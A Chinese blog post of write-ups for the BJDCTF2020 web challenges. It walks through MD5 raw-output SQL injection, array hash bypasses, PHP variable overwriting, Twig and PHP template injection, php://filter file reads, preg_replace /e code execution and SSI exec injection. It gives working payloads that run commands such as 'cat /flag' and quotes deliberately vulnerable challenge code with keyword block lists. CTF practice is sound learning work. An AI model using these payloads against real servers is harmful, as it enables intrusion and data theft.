---
title: BJDCTF2020刷题记录
date: 2020-05-13 10:25:34
updated: 2020-05-13 10:25:34
tags:
 - ctf
 - web
categories:
 - 刷题记录
---

# web

## Easy MD5

在题目返回的http header中给出了提示

```
select * from 'admin' where password=md5($pass,true)
```

要使得某个字符串的md5值转字符串后出现形如 `'or'1`

<!--more-->

自己懒得跑了直接百度一个  来自https://blog.csdn.net/qq_24810241/article/details/79908449

```
ffifdyop
md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c
转成字符串为'or'6�]��!r,��b
```

填入之后跳转到另一个界面，查看源码给出了提示

 ```html
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
 ```

传入数组绕过 `?a[]=0&b[]=1`

来到第三个页面

```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}
```

同样可以使用数组绕过，也可以使用相同md5生成器[fastcoll](http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip)生成两个相等md5，但是原始字符串不同

## Mark loves cat

扫描目录后发现存在git泄露

```
---- Scanning URL: http://2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn/ ----
==> DIRECTORY: http://2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn/.git/
+ http://2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn/flag.php (CODE:200|SIZE:0)
+ http://2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn/.git/index (CODE:200|SIZE:5725)
+ http://2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn/.git/config (CODE:200|SIZE:137)
+ http://2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn/.git/ (CODE:403|SIZE:555)
```

使用githack获取源码

```php
//获取到的index.php的部分关键代码
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){   //$x=pkey $y=pvalue
    $$x = $y;    //$$x=$pkey = $y=pvalue
}

foreach($_GET as $x => $y){   //$x=gkey $y=gvalue
    $$x = $$y;   $$flag=$$y=1     //$$x=$gkey = $gvalue
}

foreach($_GET as $x => $y){   //$x = gkey $y = $gvalue
    if($_GET['flag'] === $x && $x !== 'flag'){   
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
echo "the flag is: ".$flag;
```

这个题目考点就是源码阅读,疯狂套娃。如上分析，POST传入的参数如果是flag，结过就是`$flag=pvalue`将导致`$flag`被覆盖。

如果POST传入的参数不能为flag，就在第二个判断条件终止。就要使得`$yds=$flag`

在第二个foreach中恰好满足条件，GET传入yds=flag,然后就是不执行第一个判断语句。如果未传入参数，if就不会执行。



## The mystery of ip

打开题目是一个精美的界面

![](/pic/160.png)

上面有一个flag.php，给出了ip地址，结合题目标题。添加一个X-Forwarded-For头部

```
X-Forwarded-For: {7*7}
```

页面变成了IP:49

![](/pic/161.png)

是ssti没错了

```
输入{phpinfo()}成功执行

{system("cat /flag")}  即可拿到flag
```

## ZJCTF，不过如此

给出了源码

```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

要让$text变成文件类型，使用为data协议或者远程文件包含,提示next.php文件，使用为协议读取文件源码

```
payload:?text=data://text/plain,I%20have%20a%20dream&file=php://filter/convert.base64-encode/resource=next.php
```

得到源码

```php
//next.php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}

```

看见正则匹配函数有`/e`选项，可以命令执行 [参考文章](https://xz.aliyun.com/t/2557)

```
payload:?\S*=${getFlag()}&cmd=assert(system("cat%20/flag"));
```



## Cookie is so stable

还是和之前The mystery of ip一样的界面。flag界面变成了输入username

![](/pic/163.png)

测试xss，sql注入，均无果。猜测可能还是ssti

```,
输入{7*7}，无果再次测试{{7*7}}，发现返回了49,继续测试{{7*'7'}}，返回49
```

附上测试流程

![](/pic/162.png)

应该是twig

找payload，在[Cxlover师傅的博客](https://www.cnblogs.com/cioi/)找到了payload

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /falg")}}
```



## EasySearch

扫描目录发现备份文件

```
---- Scanning URL: http://69d43586-fb6a-4cce-9174-915b9b1788e5.node3.buuoj.cn/ ----
+ http://69d43586-fb6a-4cce-9174-915b9b1788e5.node3.buuoj.cn/index.php.swp (CODE:200|SIZE:1153)
+ http://69d43586-fb6a-4cce-9174-915b9b1788e5.node3.buuoj.cn/index.php (CODE:200|SIZE:1048)
```

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```

首先附上爆棚md5脚本(python写出来总是出错)

```php
<?php
for($i=0;$i<=1000000000;$i++)
{
    if(strcmp(md5($i),'6d0bc1')==26)
    {
        var_dump($i);  
      	break;
    }
}  
//int(2020666)
```

username数据会被写入到文件中，文件是shtml，百度一波寻找漏洞

[ssi语法](https://www.xuebuyuan.com/693626.html)

直接读取根目录`/flag文件发现flag不存在，于是查看目录，发现flag在当前文件下。

username输入

```
<!--#exec cmd="ls ../"-->
```

随后访问shtml文件

```
Hello,flag_990c66bf85a09c664f0b6741840499b2 index.php index.php.swp public
```

直接访问flag_990c66bf85a09c664f0b6741840499b2文件即可

## [未完成]EzPHP

查看源码发现提示

```
<!-- Here is the real page =w= -->
<!-- GFXEIM3YFZYGQ4A= -->
```

base32解码后得到`1nD3x.php`

访问即可得到源码

```php+HTML
<?php
highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?>
This is a very simple challenge and if you solve it I will give you a flag. Good Luck!
Aqua is the cutest five-year-old child in the world! Isn't it ?
```

